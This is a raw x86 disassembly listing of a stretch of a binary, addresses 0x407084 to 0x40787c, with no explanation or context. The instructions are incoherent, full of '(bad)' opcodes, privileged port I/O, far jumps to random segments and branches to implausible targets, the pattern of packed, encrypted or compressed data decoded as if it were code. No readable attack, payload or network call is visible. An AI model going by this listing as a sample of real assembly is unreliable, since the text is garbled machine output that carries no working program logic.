  407084:	test   BYTE PTR [ecx],ch
  407086:	je     0x40707f
  407088:	inc    esi
  407089:	test   BYTE PTR [esi-0x80],dl
  40708c:	sub    bh,BYTE PTR [eax+0x9]
  40708f:	mov    esi,0x9ee2e0
  407094:	mov    eax,ds:0xa00f1e7c
  407099:	mov    ds:0xa65ec0ef,al
  40709e:	push   esi
  40709f:	jmp    0x40702b
  4070a1:	into   
  4070a2:	(bad)
  4070a7:	mov    edi,0x4828d699
  4070ac:	jmp    0x407063
  4070ae:	adc    eax,0x832b850e
  4070b3:	stos   BYTE PTR es:[edi],al
  4070b4:	sahf   
  4070b5:	jae    0x4070bd
  4070b7:	mov    ch,ah
  4070b9:	je     0x407087
  4070bb:	stos   DWORD PTR es:[edi],eax
  4070bc:	(bad)  [ebx]
  4070be:	cmp    esi,DWORD PTR [ecx+0x1a6638ba]
  4070c4:	(bad)  
  4070c5:	int3   
  4070c6:	fiadd  WORD PTR [ebx+0x5c4224c6]
  4070cc:	inc    ebx
  4070cd:	mov    edi,0xd93368ed
  4070d2:	jl     0x407151
  4070d4:	push   eax
  4070d5:	push   cs
  4070d6:	mov    bh,ch
  4070d8:	jmp    ebx
  4070da:	dec    ebp
  4070db:	je     0x4070f1
  4070dd:	sub    edi,DWORD PTR [ebx+eiz*4+0x32fd9b22]
  4070e4:	cmp    ebx,DWORD PTR [ebx+0x69]
  4070e7:	neg    ecx
  4070e9:	leave  
  4070ea:	pop    esi
  4070eb:	les    ebx,FWORD PTR [ecx]
  4070ed:	add    al,0xef
  4070ef:	xchg   edi,eax
  4070f0:	push   esi
  4070f1:	imul   BYTE PTR [edx]
  4070f3:	lds    esp,FWORD PTR ds:0x7c013d97
  4070f9:	scas   al,BYTE PTR es:[edi]
  4070fa:	call   0xc24afe7d
  4070ff:	out    dx,eax
  407100:	or     ebx,esp
  407102:	in     eax,dx
  407103:	jbe    0x4070ad
  407105:	cli    
  407106:	xor    BYTE PTR [edi],ah
  407108:	loopne 0x4070fc
  40710a:	add    DWORD PTR [eax],eax
  40710c:	in     eax,dx
  40710d:	aad    0xd6
  40710f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407110:	or     DWORD PTR [esi-0x6e22fa7e],eax
  407116:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407117:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407118:	ins    BYTE PTR es:[edi],dx
  407119:	fsubr  QWORD PTR [ecx]
  40711b:	in     eax,0x84
  40711d:	push   ebx
  40711f:	repz sti 
  407121:	inc    ebx
  407122:	nop
  407123:	ffreep st(1)
  407125:	rol    DWORD PTR [edi-0x5878fd45],cl
  40712b:	mov    esi,0xc79edfb4
  407130:	test   ch,ch
  407132:	xchg   ebx,eax
  407133:	mov    al,ds:0xa57c3224
  407138:	stos   BYTE PTR es:[edi],al
  407139:	mov    ebp,0x950ff2ae
  40713e:	sbb    dl,BYTE PTR [edi+0x2ca78bb4]
  407144:	sar    DWORD PTR [ecx-0x3bf33a18],0xe2
  40714b:	scas   eax,DWORD PTR es:[edi]
  40714c:	arpl   WORD PTR [ebx],cx
  40714e:	xchg   ecx,eax
  40714f:	mul    BYTE PTR [ebp+0xb945181]
  407155:	push   0xa2826b0d
  40715a:	nop
  40715b:	inc    esp
  40715c:	or     eax,DWORD PTR [edx-0x25]
  40715f:	add    eax,DWORD PTR [ebx-0x72810394]
  407165:	xor    eax,0x1ed9823f
  40716a:	sbb    ebp,ecx
  40716c:	imul   edi,DWORD PTR [eax+0xe],0x460081f4
  407173:	pushf  
  407174:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407175:	lods   eax,DWORD PTR ds:[esi]
  407176:	jnp    0x407120
  407178:	cmp    esp,DWORD PTR [edi+edi*4]
  40717b:	in     al,0x8f
  40717d:	fcomi  st,st(5)
  40717f:	and    al,0x97
  407181:	popa   
  407182:	(bad)  
  407183:	std    
  407184:	aas    
  407185:	jl     0x407128
  407187:	js     0x4071fa
  407189:	mov    ebx,DWORD PTR [esi]
  40718b:	or     BYTE PTR [ecx+0x391f45f1],ch
  407191:	ds push ds
  407193:	leave  
  407194:	popa   
  407195:	mov    dh,BYTE PTR [edi-0x5a]
  407198:	add    DWORD PTR [ebx],edx
  40719a:	or     DWORD PTR [ecx-0x1b],0x4746444b
  4071a1:	and    ah,BYTE PTR fs:[ebx-0x314ae74e]
  4071a8:	sbb    BYTE PTR [edx],ah
  4071aa:	imul   eax,DWORD PTR [ebx+0xd2202b8],0x20
  4071b1:	dec    esp
  4071b2:	inc    ebx
  4071b3:	jg     0x4d677f52
  4071b9:	pop    ebx
  4071ba:	aad    0xda
  4071bc:	pop    DWORD PTR [eax]
  4071be:	fdivrp st(2),st
  4071c0:	or     BYTE PTR [esi-0x584b76c],al
  4071c6:	adc    esi,esp
  4071c8:	jmp    0x4071e3
  4071ca:	and    BYTE PTR [edx-0x1],0x84
  4071ce:	mov    al,0x72
  4071d0:	or     DWORD PTR [edx+ecx*1-0x48574dde],ecx
  4071d7:	inc    ebp
  4071d8:	xor    DWORD PTR [eax-0x8],esi
  4071db:	adc    al,0x27
  4071dd:	int3   
  4071de:	and    BYTE PTR [esi],0x3f
  4071e1:	mov    DWORD PTR [ebp+0x5d47043c],ebp
  4071e7:	jbe    0x407197
  4071e9:	jb     0x407266
  4071eb:	jb     0x407244
  4071ed:	retf   0xa235
  4071f0:	mov    edx,0x7c021106
  4071f6:	and    BYTE PTR [eax+0x6513c4fa],ah
  4071fc:	adc    al,0x50
  4071fe:	in     al,dx
  4071ff:	jmp    0xef46:0x6ae9de94
  407206:	dec    eax
  407207:	push   ecx
  407208:	test   al,0x80
  40720a:	cmp    DWORD PTR [eax+0x9],ebx
  40720d:	cmp    BYTE PTR [eax-0x5853cd65],0x7
  407214:	mov    DWORD PTR [esi+eax*2+0x682a8532],esi
  40721b:	in     al,dx
  40721c:	xor    bh,0x33
  40721f:	icebp  
  407220:	int3   
  407221:	push   eax
  407222:	outs   dx,DWORD PTR ds:[esi]
  407223:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407224:	xchg   esi,eax
  407225:	jle    0x4071c2
  407227:	pop    ebx
  407228:	mov    edx,0x3c9ba783
  40722d:	xchg   edi,eax
  40722e:	push   ds
  40722f:	ins    BYTE PTR es:[edi],dx
  407230:	ja     0x407277
  407232:	jb     0x407256
  407234:	adc    cl,BYTE PTR [edi-0x60a0132f]
  40723a:	adc    ebx,DWORD PTR [ebp+0x3c11053a]
  407240:	xchg   esi,eax
  407241:	outs   dx,DWORD PTR ds:[esi]
  407242:	sbb    ebp,DWORD PTR ds:0x3f49a1c1
  407248:	jmp    0xd3f39f86
  40724d:	stos   DWORD PTR es:[edi],eax
  40724e:	es push 0xffffffe9
  407251:	lods   eax,DWORD PTR ds:[esi]
  407252:	inc    ebp
  407253:	adc    al,0xf3
  407255:	repz fcmovu st,st(6)
  407258:	adc    ah,BYTE PTR [ebp+0x5a]
  40725b:	stos   BYTE PTR es:[edi],al
  40725c:	mov    ebp,0x85967c51
  407261:	mov    esp,DWORD PTR [edx+0x21]
  407264:	pop    ebp
  407266:	mov    al,0xaa
  407268:	ds fs pop ebp
  40726b:	push   ss
  40726c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40726d:	xchg   edi,eax
  40726e:	inc    ebx
  40726f:	and    ebx,DWORD PTR [edi+eax*4]
  407272:	sub    eax,0xa2abefd4
  407277:	retf   0xd0e
  40727a:	jmp    DWORD PTR [edi+0x31]
  40727d:	lea    esi,[ecx]
  40727f:	sub    ch,BYTE PTR [esi+0x37]
  407282:	(bad)  
  407284:	fadd   DWORD PTR [eax]
  407286:	ss nop
  407288:	add    eax,0xf91a3d11
  40728d:	cs dec edx
  40728f:	stc    
  407290:	inc    eax
  407291:	push   ecx
  407292:	dec    ebx
  407293:	or     eax,0x9a7a2eac
  407298:	daa    
  407299:	out    dx,al
  40729a:	mov    esp,DWORD PTR [edx]
  40729c:	xchg   ecx,eax
  40729d:	mov    esp,0xf72cbf6f
  4072a2:	jns    0x40729e
  4072a4:	xchg   ebp,eax
  4072a5:	mov    BYTE PTR [edx],ch
  4072a7:	lahf   
  4072a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4072a9:	cdq    
  4072aa:	test   al,bl
  4072ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4072ad:	rcr    BYTE PTR [edi+0x8],cl
  4072b0:	xlat   BYTE PTR ds:[ebx]
  4072b1:	(bad)  
  4072b3:	in     al,dx
  4072b4:	mov    ecx,0xc21dd815
  4072b9:	inc    ebx
  4072ba:	dec    edi
  4072bb:	ficom  DWORD PTR [ecx+0x23967935]
  4072c1:	and    DWORD PTR [ebx+0x7c],eax
  4072c4:	sahf   
  4072c5:	stc    
  4072c6:	ins    DWORD PTR es:[edi],dx
  4072c7:	add    dh,BYTE PTR ds:0x99f1abf2
  4072cd:	imul   eax,DWORD PTR [ebx+edi*1],0x21
  4072d1:	sar    BYTE PTR cs:[esp+ebx*2],cl
  4072d5:	add    al,0x77
  4072d7:	daa    
  4072d8:	shl    BYTE PTR [ebx],0x91
  4072db:	add    ah,ch
  4072dd:	cli    
  4072de:	or     ecx,edi
  4072e0:	std    
  4072e1:	pop    ebp
  4072e2:	jp     0x40727c
  4072e4:	xor    esp,DWORD PTR [ebx-0x78db3b34]
  4072ea:	xor    bl,BYTE PTR [ebx]
  4072ec:	and    bh,BYTE PTR fs:[ecx]
  4072ef:	mov    dl,BYTE PTR [eax]
  4072f1:	mov    bh,0x2d
  4072f3:	cmp    BYTE PTR [eax],bl
  4072f5:	popf   
  4072f6:	mov    al,ds:0xc3ac9ec5
  4072fb:	jecxz  0x4072a6
  4072fd:	arpl   bx,bx
  4072ff:	dec    eax
  407300:	xor    bh,BYTE PTR [ebx]
  407302:	retf   
  407303:	dec    esp
  407304:	add    dl,BYTE PTR [ecx+0x3423b2f]
  40730a:	sahf   
  40730b:	jmp    0xb7a0d093
  407310:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407311:	aaa    
  407312:	dec    eax
  407313:	icebp  
  407314:	add    eax,0xee75cfcc
  407319:	aam    0x30
  40731b:	add    DWORD PTR [edi+0x43],edx
  40731e:	dec    ebx
  40731f:	or     al,0x9b
  407321:	test   DWORD PTR [eiz*4+0x27a57eed],eax
  407328:	mov    ebp,0x7405eb00
  40732d:	pop    eax
  40732e:	mov    ah,0x8e
  407330:	rcr    BYTE PTR [ebx],1
  407332:	cli    
  407333:	adc    DWORD PTR [esi+0x4a1bda22],0xdd17fd37
  40733d:	cmp    DWORD PTR ds:0x64f87f0c,esp
  407343:	ja     0x40739c
  407345:	sbb    al,0xf8
  407347:	push   eax
  407348:	mov    ecx,0xc432f9a9
  40734d:	rol    DWORD PTR [edi-0x422f45b1],0xfc
  407354:	add    DWORD PTR ds:0x229660fb,esi
  40735a:	shr    dh,0xd1
  40735d:	xchg   ebp,eax
  40735e:	push   ecx
  40735f:	pushf  
  407360:	arpl   sp,dx
  407362:	lds    edi,FWORD PTR [ecx-0x22]
  407365:	xchg   edx,eax
  407366:	sbb    esp,0xffffffe6
  407369:	mov    edi,0x2ef33a1b
  40736e:	xor    edx,DWORD PTR [ebp+0x1e291c8f]
  407374:	jo     0x4072fe
  407376:	push   ecx
  407377:	imul   esp,ebx,0x4b
  40737a:	enter  0x6a64,0xd0
  40737e:	mov    eax,ds:0x90e52a28
  407383:	test   BYTE PTR [eax-0x40],0xc7
  407387:	inc    esp
  407388:	inc    ecx
  407389:	ret    
  40738a:	out    0x41,eax
  40738c:	and    DWORD PTR [edx],eax
  40738e:	lds    edx,FWORD PTR [ecx-0x1b]
  407391:	ret    0x3cf2
  407394:	or     BYTE PTR [ecx-0x79f29673],0xe4
  40739b:	jno    0x407343
  40739d:	inc    edx
  40739e:	out    0x93,al
  4073a0:	rcl    edx,1
  4073a2:	ficomp WORD PTR [ecx-0x445c35e1]
  4073a8:	popa   
  4073a9:	mov    ds:0xbe3d08e9,eax
  4073ae:	push   es
  4073af:	pmaddwd mm6,QWORD PTR [eax+esi*4-0x794cf6d]
  4073b7:	xchg   edi,eax
  4073b8:	mov    dh,0x86
  4073ba:	loopne 0x4073bd
  4073bc:	test   BYTE PTR [ebp+0x4],ah
  4073bf:	(bad)  
  4073c0:	jmp    0xb936:0xf07b91af
  4073c7:	jmp    FWORD PTR ds:0xcd26ca23
  4073cd:	int    0xbd
  4073cf:	jb     0x407390
  4073d1:	ja     0x407384
  4073d3:	enter  0x4697,0xd7
  4073d7:	xchg   ebp,eax
  4073d8:	lods   eax,DWORD PTR ds:[esi]
  4073d9:	and    ecx,DWORD PTR [eax+edi*1+0x5f]
  4073dd:	test   al,0x16
  4073df:	xor    al,0x4f
  4073e1:	pop    eax
  4073e2:	ds or  al,0x15
  4073e5:	sbb    edx,DWORD PTR [ecx+0x2a]
  4073e8:	pop    ecx
  4073e9:	iret   
  4073ea:	rcl    DWORD PTR [ecx-0x4c2622ec],1
  4073f0:	mov    ds:0xb2e45085,eax
  4073f5:	fistp  DWORD PTR [ecx+0x22cf787]
  4073fb:	(bad)  
  4073fc:	imul   eax,DWORD PTR [esi+0x45a56f3d],0xcdcb60eb
  407406:	retf   0x6b62
  407409:	adc    BYTE PTR [eax-0x35],dl
  40740c:	jb     0x40747c
  40740e:	or     eax,0x8f5ae464
  407413:	jno    0x407465
  407415:	add    BYTE PTR [ecx-0x5b],dh
  407418:	lahf   
  407419:	push   0xffffff9e
  40741b:	push   eax
  40741c:	dec    ebp
  40741d:	or     al,0xc4
  40741f:	add    al,0x61
  407421:	stos   DWORD PTR es:[edi],eax
  407422:	inc    ebx
  407423:	shl    DWORD PTR [ecx+eiz*1+0x5ad3a129],cl
  40742a:	mov    bl,0x5a
  40742c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40742d:	les    si,DWORD PTR [eax]
  407430:	mov    cs,WORD PTR [ebx-0x1cba99ec]
  407436:	mov    cl,0xdc
  407438:	cmp    ax,WORD PTR [ebx]
  40743b:	add    al,0x80
  40743d:	popa   
  40743e:	and    eax,DWORD PTR [edx-0x15]
  407441:	sbb    DWORD PTR [ecx-0x24bbef5f],0x853ae8e6
  40744b:	leave  
  40744c:	xor    eax,0x8e8a0da8
  407451:	pop    ecx
  407452:	cs pop ds
  407454:	lods   al,BYTE PTR ds:[esi]
  407455:	xor    BYTE PTR [esp+ebx*4+0x1916764f],al
  40745c:	imul   edi,DWORD PTR [edi+0x38],0xffffffa3
  407460:	aaa    
  407461:	mov    BYTE PTR [ebp-0x538db736],dl
  407467:	mov    DWORD PTR [eax+0x3a],eax
  40746a:	mov    esi,0xb282a7cc
  40746f:	retf   0x6aca
  407472:	pop    edx
  407473:	ror    BYTE PTR [ebx-0x75373527],0x2b
  40747a:	shr    BYTE PTR [ecx-0x7],cl
  40747d:	call   esp
  40747f:	jo     0x407420
  407481:	ret    0x6384
  407484:	mov    esi,0x91b355ff
  407489:	push   ecx
  40748a:	adc    al,0xcc
  40748c:	pop    edi
  40748d:	(bad)  
  40748f:	sub    al,0x88
  407491:	test   al,0x5a
  407493:	fisttp QWORD PTR [edx-0x455dae0a]
  407499:	call   0xa78a:0xb576ccf3
  4074a0:	or     esi,DWORD PTR [edx+0x14209843]
  4074a6:	sub    BYTE PTR [ecx-0x57],0x38
  4074aa:	add    BYTE PTR [esi],dl
  4074ac:	ins    BYTE PTR es:[edi],dx
  4074ad:	fidiv  DWORD PTR [esi+edi*2-0x28]
  4074b1:	sar    dl,1
  4074b3:	mov    esi,0xadf91d1e
  4074b8:	push   ds
  4074b9:	int3   
  4074ba:	sbb    esi,0x8d0e4d
  4074c0:	mov    dl,0xd1
  4074c2:	mov    edi,0x9e2486ff
  4074c7:	mov    DWORD PTR [edi+0x12ba2a67],ecx
  4074cd:	dec    ebp
  4074ce:	push   esi
  4074cf:	push   0x30f8c16
  4074d4:	les    esp,FWORD PTR [eax]
  4074d6:	or     ah,BYTE PTR [eax-0x73]
  4074d9:	rol    DWORD PTR [ecx],0xcc
  4074dc:	clc    
  4074dd:	or     ah,BYTE PTR [ebx-0x48]
  4074e0:	xor    BYTE PTR [eax],bh
  4074e2:	popa   
  4074e3:	or     BYTE PTR [edx-0x64],al
  4074e6:	ror    BYTE PTR [edx],cl
  4074e8:	sti    
  4074e9:	jb     0x40754c
  4074eb:	jno    0x4074b3
  4074ed:	aad    0xb7
  4074ef:	repz sar DWORD PTR [ecx-0x1405c37f],0x7a
  4074f7:	jge    0x4074ff
  4074f9:	imul   eax,DWORD PTR [ebx+0xf],0xce34b54
  407500:	fidiv  WORD PTR [edi+0x12]
  407503:	neg    BYTE PTR [esi+0x613fd87]
  407509:	js     0x4074c9
  40750b:	popf   
  40750c:	or     esp,DWORD PTR ds:0x96da051
  407512:	ret    
  407513:	cmp    eax,edx
  407515:	mov    ebp,0xd40620f8
  40751a:	cmp    BYTE PTR [ebp+0x44],al
  40751d:	aas    
  40751e:	mov    ch,0xed
  407520:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407521:	aas    
  407522:	pop    esp
  407523:	out    dx,eax
  407524:	or     DWORD PTR ds:0x3c0a726f,0xcddc5ac0
  40752e:	loop   0x407591
  407530:	mov    al,0x59
  407532:	and    eax,0x727492a
  407537:	or     esi,ecx
  407539:	mov    ecx,esi
  40753b:	es pop edi
  40753d:	cmp    dl,BYTE PTR [esp+eax*8]
  407540:	jmp    FWORD PTR ds:0x1e2813c2
  407546:	push   ecx
  407547:	sbb    edx,eax
  407549:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40754a:	lock out 0xce,al
  40754d:	mov    eax,ds:0x67ffa2c2
  407552:	mov    esi,0x441290d1
  407557:	push   0x32
  407559:	add    al,0x42
  40755b:	add    dl,BYTE PTR [ebp+0x5c]
  40755e:	mov    ds:0xdfd010f2,al
  407563:	test   al,0x8
  407565:	inc    esp
  407566:	adc    eax,0x496a553c
  40756b:	shl    BYTE PTR [eax+0x6],cl
  40756e:	dec    esi
  40756f:	hlt    
  407570:	dec    edx
  407571:	dec    edx
  407572:	jb     0x40753e
  407574:	inc    edi
  407575:	test   eax,0x6d176db6
  40757a:	xor    BYTE PTR [esi],bh
  40757c:	mov    al,0xb5
  40757e:	fstp   TBYTE PTR [ebx-0x1f]
  407581:	sub    eax,0x9cb3a9f7
  407586:	lock pop esp
  407588:	loopne 0x4075de
  40758a:	cmp    eax,0x57e5e016
  40758f:	push   esi
  407590:	mov    ds:0x8c0aef2f,eax
  407595:	popf   
  407596:	push   edx
  407597:	div    BYTE PTR [edx-0x49]
  40759a:	xor    DWORD PTR [ecx],esp
  40759c:	fidivr WORD PTR [edx+ecx*4-0x59]
  4075a0:	mov    esp,0xae6b6f32
  4075a5:	push   0xfffffff0
  4075a7:	dec    esp
  4075a8:	sub    dh,BYTE PTR [edx+0x29]
  4075ab:	jns    0x407585
  4075ad:	cmp    al,0xe1
  4075b0:	clc    
  4075b1:	and    al,dl
  4075b3:	lahf   
  4075b4:	fiadd  WORD PTR [ebx+0x3a67434a]
  4075ba:	pop    ds
  4075bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4075bc:	mov    ah,BYTE PTR [eax+0x16]
  4075bf:	mov    al,ds:0x691e2c56
  4075c4:	sbb    ch,ah
  4075c6:	lods   eax,DWORD PTR ds:[esi]
  4075c7:	or     edx,DWORD PTR [ebx+eax*4-0x26]
  4075cb:	in     al,0x2a
  4075cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4075ce:	sub    ebx,DWORD PTR [esi-0x49a32849]
  4075d4:	adc    ebx,DWORD PTR [ebx+0xe670781]
  4075da:	or     BYTE PTR cs:[edi+0x10],bh
  4075de:	inc    esi
  4075df:	sahf   
  4075e0:	pop    esp
  4075e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4075e2:	repz xlat BYTE PTR ds:[ebx]
  4075e4:	sub    ecx,DWORD PTR [eax]
  4075e6:	mov    BYTE PTR [edi-0xa],ch
  4075e9:	sub    DWORD PTR [edi],edi
  4075eb:	cli    
  4075ec:	sub    DWORD PTR [ebp-0x6d],0xffffff9a
  4075f0:	add    eax,0x544c5be9
  4075f5:	(bad)  
  4075f6:	mov    eax,0xd7691561
  4075fb:	pop    eax
  4075fc:	pusha  
  4075fd:	mov    bh,0xff
  4075ff:	xlat   BYTE PTR ds:[ebx]
  407600:	pop    ecx
  407601:	cmp    DWORD PTR [ebp+ebp*1-0x40],esi
  407605:	pusha  
  407606:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407607:	xor    al,0xa
  407609:	repz retf 
  40760b:	je     0x4075fd
  40760d:	dec    ebx
  40760e:	(bad)  
  40760f:	es sbb eax,0x3e2bcfd4
  407615:	and    ebx,esp
  407617:	pop    ebx
  407618:	(bad)  
  407619:	rcl    BYTE PTR [edx+0x5a],cl
  40761c:	ficom  WORD PTR [ecx+0x20]
  40761f:	es js  0x40760f
  407622:	fild   QWORD PTR [ebp-0x5b021ccb]
  407628:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407629:	xchg   ebx,eax
  40762a:	out    0xd1,al
  40762c:	add    bl,BYTE PTR [edi-0x75bc2a1d]
  407632:	lods   eax,DWORD PTR ds:[esi]
  407633:	sbb    eax,DWORD PTR [esi]
  407635:	ss call 0x4130:0x217e94c9
  40763d:	(bad)  
  40763f:	in     eax,0x80
  407641:	dec    ebp
  407642:	in     al,dx
  407643:	cmovne eax,DWORD PTR [ecx-0x5afdf15d]
  40764a:	in     al,0xb4
  40764c:	xor    BYTE PTR [edx],bh
  40764e:	or     al,0xea
  407650:	stc    
  407651:	inc    eax
  407652:	jo     0x40760e
  407654:	retf   
  407655:	daa    
  407656:	push   eax
  407657:	fisttp WORD PTR ds:0x78823f7
  40765d:	repz adc BYTE PTR [edi],dl
  407660:	sub    esp,DWORD PTR [edx-0x60]
  407663:	sub    DWORD PTR [ecx-0x5f],0x68e8051a
  40766a:	push   eax
  40766b:	mov    al,0xe7
  40766d:	xchg   DWORD PTR [ebx+0x19],eax
  407670:	adc    DWORD PTR ds:0xf8b9291b,ecx
  407676:	dec    esp
  407677:	mov    cl,0x26
  407679:	cmc    
  40767a:	mov    dh,BYTE PTR [edi-0x36]
  40767d:	sub    BYTE PTR [esi-0x5f3cffc1],bh
  407683:	and    bl,BYTE PTR [esi]
  407685:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407686:	push   esi
  407687:	inc    ebx
  407688:	adc    eax,DWORD PTR [edx+ebx*2]
  40768b:	jle    0x407684
  40768d:	mov    ebx,0x8aa9ab90
  407692:	in     eax,0xef
  407694:	push   esp
  407695:	(bad)  
  407696:	scas   al,BYTE PTR es:[edi]
  407697:	sbb    ah,al
  407699:	jns    0x4076d1
  40769b:	daa    
  40769c:	mov    ds:0xd9832495,al
  4076a1:	out    dx,al
  4076a2:	(bad)  
  4076a3:	and    edx,ebp
  4076a5:	jp     0x4076ee
  4076a7:	xchg   ebx,eax
  4076a8:	call   0x23c3:0x88f692c7
  4076af:	out    dx,al
  4076b0:	(bad)  
  4076b1:	hlt    
  4076b2:	pop    ss
  4076b3:	inc    esp
  4076b4:	mov    esp,DWORD PTR [ebx+0x1cfde03d]
  4076ba:	sbb    DWORD PTR [edi+0x42],ebp
  4076bd:	jne    0x407680
  4076bf:	mov    eax,0x16f6f27b
  4076c4:	xor    DWORD PTR [edx+0x4c2217a5],ecx
  4076ca:	pop    es
  4076cb:	mov    ah,0x8c
  4076cd:	test   BYTE PTR [eax],ch
  4076cf:	(bad)  
  4076d0:	in     eax,dx
  4076d1:	into   
  4076d2:	dec    esp
  4076d3:	std    
  4076d4:	fiadd  WORD PTR [edx]
  4076d6:	ret    
  4076d7:	ss jns 0x407662
  4076da:	addr16 jnp 0x40771f
  4076dd:	sti    
  4076de:	cmp    BYTE PTR [edx],0x80
  4076e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4076e2:	jg     0x4076f7
  4076e4:	test   DWORD PTR [esi],esp
  4076e6:	jns    0x407760
  4076e8:	or     eax,DWORD PTR [ebx-0x1c]
  4076eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4076ec:	push   ebp
  4076ee:	jbe    0x40776c
  4076f0:	mov    bh,dh
  4076f2:	retf   0x5b23
  4076f5:	push   0x13d12577
  4076fa:	das    
  4076fb:	or     edi,edi
  4076fd:	sub    eax,0x998495f5
  407702:	call   DWORD PTR [ecx-0x31]
  407705:	inc    edi
  407706:	jnp    0x40771e
  407708:	sub    eax,0xc677589d
  40770d:	(bad)  
  40770f:	sub    bh,BYTE PTR [eax]
  407711:	add    ebx,esp
  407713:	pop    esp
  407714:	(bad)  
  407715:	stos   DWORD PTR es:[edi],eax
  407716:	jmp    0xeeb1ce78
  40771b:	mov    esp,0xe88ff11f
  407720:	xlat   BYTE PTR ds:[ebx]
  407721:	adc    DWORD PTR [ecx],ecx
  407723:	arpl   WORD PTR [ebx+ecx*8-0x7914aade],sp
  40772a:	push   edx
  40772b:	scas   al,BYTE PTR es:[edi]
  40772c:	retf   
  40772d:	repz xor edi,edi
  407730:	adc    esp,0x77
  407733:	test   eax,0xbda4a655
  407738:	lods   al,BYTE PTR ds:[esi]
  407739:	imul   esp,DWORD PTR ds:0x15308815,0xffffff9f
  407740:	mov    BYTE PTR [ebx-0x37deccb9],0x17
  407747:	mov    edx,0x20797411
  40774c:	(bad)  
  40774d:	sar    esi,0x6b
  407750:	loop   0x407725
  407752:	mov    edi,DWORD PTR [eax+0x7df652a1]
  407758:	out    dx,eax
  407759:	repz (bad) 
  40775b:	lea    ebp,[edi]
  40775d:	(bad)  
  40775e:	adc    eax,ecx
  407760:	mov    dh,0x5e
  407762:	jle    0x407713
  407764:	xchg   esp,eax
  407765:	sub    esi,DWORD PTR [edi]
  407767:	cmp    BYTE PTR [ebx-0x3a0048f4],bh
  40776d:	leave  
  40776e:	retf   
  40776f:	mov    dl,0x9f
  407771:	scas   eax,DWORD PTR es:[edi]
  407772:	ss push 0x1d
  407775:	retf   0x6666
  407778:	popf   
  407779:	push   ecx
  40777a:	jmp    0x407764
  40777c:	(bad)  [eax+0x23]
  40777f:	add    DWORD PTR [eax-0x2f],esi
  407782:	fdivr  QWORD PTR [edx]
  407784:	jo     0x4077d2
  407786:	mov    WORD PTR es:[edi+0x607032ba],cs
  40778d:	mov    ds:0x6e680bf5,eax
  407792:	inc    ecx
  407793:	pop    es
  407794:	pop    esp
  407795:	out    0xfc,al
  407797:	add    eax,0x92b620b
  40779c:	and    bl,BYTE PTR [ebx]
  40779e:	xchg   edx,eax
  40779f:	mov    edx,0x84258668
  4077a4:	add    al,0x7c
  4077a6:	loop   0x407741
  4077a8:	fisubr WORD PTR [esi+0x69b2c25b]
  4077ae:	mov    edx,0x529dbd47
  4077b3:	mov    al,0x6c
  4077b5:	and    esi,eax
  4077b7:	add    dl,BYTE PTR [ebx+edi*1+0x56]
  4077bb:	add    al,0x13
  4077bd:	sub    al,0xb
  4077bf:	fiadd  WORD PTR [esi-0x2]
  4077c2:	pop    ebx
  4077c3:	stos   BYTE PTR es:[edi],al
  4077c4:	or     eax,0xe0304f01
  4077c9:	test   al,0xca
  4077cb:	add    al,0x59
  4077cd:	imul   ebp,DWORD PTR [edi],0xffffff99
  4077d0:	xor    DWORD PTR [eax],eax
  4077d2:	sub    BYTE PTR [esi],0x16
  4077d5:	sub    eax,0xb7d52196
  4077da:	(bad)  
  4077db:	out    dx,al
  4077dc:	sbb    DWORD PTR [esi-0x15f2a521],0xffffff99
  4077e3:	mov    BYTE PTR [ebx],al
  4077e5:	popa   
  4077e6:	cmp    DWORD PTR ds:0x67fa1714,edx
  4077ec:	xchg   DWORD PTR [edi+0x5d],ebp
  4077ef:	xchg   edx,eax
  4077f0:	cwde   
  4077f1:	(bad)
  4077f4:	repnz pop esi
  4077f6:	push   cs
  4077f7:	dec    ebp
  4077f8:	dec    esi
  4077f9:	or     edx,DWORD PTR [ecx+esi*4-0x634c0d87]
  407800:	push   0xffffffca
  407802:	xor    cl,al
  407804:	sub    esp,ecx
  407806:	mov    esi,0xbb9ab78b
  40780b:	inc    edi
  40780c:	push   ss
  40780d:	out    dx,al
  40780e:	push   eax
  40780f:	cmp    al,0x89
  407811:	mov    edx,0xfb03609a
  407816:	cmc    
  407817:	push   0xd69a7a77
  40781c:	lds    edx,FWORD PTR [edx+0x4a343635]
  407822:	test   ebx,0xd7b2daeb
  407828:	fild   QWORD PTR ds:0xfa99e460
  40782e:	cli    
  40782f:	push   ecx
  407830:	push   esi
  407831:	or     al,al
  407833:	sbb    al,0x15
  407835:	sub    eax,0xd6ded0c3
  40783a:	lea    esi,[ebx+0x6]
  40783d:	xor    ah,cl
  40783f:	push   ds
  407840:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407841:	gs sub bl,dh
  407844:	or     al,0x7b
  407846:	mov    esp,0x88c68c38
  40784b:	fcmovnbe st,st(6)
  40784d:	jmp    0x4077e5
  40784f:	and    BYTE PTR [ebp+0x3c9901e7],0xac
  407856:	inc    edx
  407857:	and    DWORD PTR [eax],eax
  407859:	jmp    0x7165597e
  40785e:	adc    esi,ebx
  407860:	dec    ebp
  407861:	push   0x76078cdd
  407866:	lock sti 
  407868:	mov    eax,0x6dfce504
  40786d:	jecxz  0x407877
  40786f:	retf   0xdc4e
  407872:	pushf  
  407873:	inc    esi
  407874:	add    esp,edx
  407876:	test   DWORD PTR [esi-0x4db55020],ebx
  40787c:	addr16 in eax,0xb3
